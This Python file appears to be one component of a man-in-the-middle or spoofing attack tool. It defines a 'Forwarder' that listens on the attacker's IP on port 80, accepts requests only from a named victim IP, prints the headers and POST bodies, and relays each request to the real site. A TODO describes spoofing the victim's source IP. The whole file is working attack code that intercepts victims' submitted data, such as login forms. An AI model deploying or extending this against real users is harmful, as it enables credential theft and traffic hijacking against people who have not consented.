from logger import log_info, log_warning
import http.client
import http.server
import socketserver
import requests

# TODO: Change the forwarder such that the packages sent to the server have the source ip of the victim.

site_to_spoof = None
ip_victim = None

# Custom HTTP request handler that only allows requests from the victim.
class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_GET(self):
        # Get the client's IP address
        client_ip = self.client_address[0]
        
        # Check if the client's IP address matches the allowed IP
        if client_ip == ip_victim:
            # Print request path and headers
            print("Received GET request")
            print("Path:", self.path)
            print("Headers:", self.headers)

            # Use requests to forward this request to site_to_spoof
            response = requests.get("https://" + site_to_spoof + self.path, headers=self.headers, )
            
            # Send the response back to the client
            self.send_response(response.status_code)
            self.end_headers()
            self.wfile.write(response.content)
        else:
            # Send a 403 Forbidden response
            self.send_response(403)
            self.end_headers()
            self.wfile.write(b'403 Forbidden: Access denied')

    def do_POST(self):
        # Get the client's IP address
        client_ip = self.client_address[0]
        
        # Check if the client's IP address matches the allowed IP
        if client_ip == ip_victim:
            # Print request path and headers
            print("Received POST request")
            print("Path:", self.path)
            print("Headers:", self.headers)

            # Read the content length from the headers
            content_length = int(self.headers['Content-Length'])
            # Read the POST data
            post_data = self.rfile.read(content_length)
            print("Body:", post_data.decode('utf-8'))
            
            # Use requests to forward this request to site_to_spoof
            response = requests.post("https://" + site_to_spoof + self.path, data=post_data)
            
            # Send the response back to the client
            self.send_response(response.status_code)
            self.end_headers()
            self.wfile.write(response.content)
        else:
            # Send a 403 Forbidden response
            self.send_response(403)
            self.end_headers()
            self.wfile.write(b'403 Forbidden: Access denied')


class Forwarder:
    def __init__(self, interface, ip_attacker, ip_victim_, site_to_spoof_):
        global ip_victim, site_to_spoof
        self.interface = interface
        self.ip_attacker = ip_attacker
        ip_victim = ip_victim_
        site_to_spoof = site_to_spoof_

    def forward(self):
        log_info("Starting packet forwarding")

        # Start listening for HTTP requests from the victim
        log_info("Starting HTTP server")
        socketserver.TCPServer.allow_reuse_address = True
        httpd = socketserver.TCPServer((self.ip_attacker, 80), CustomHTTPRequestHandler)
        httpd.serve_forever()

        log_warning("Stopping packet forwarding")
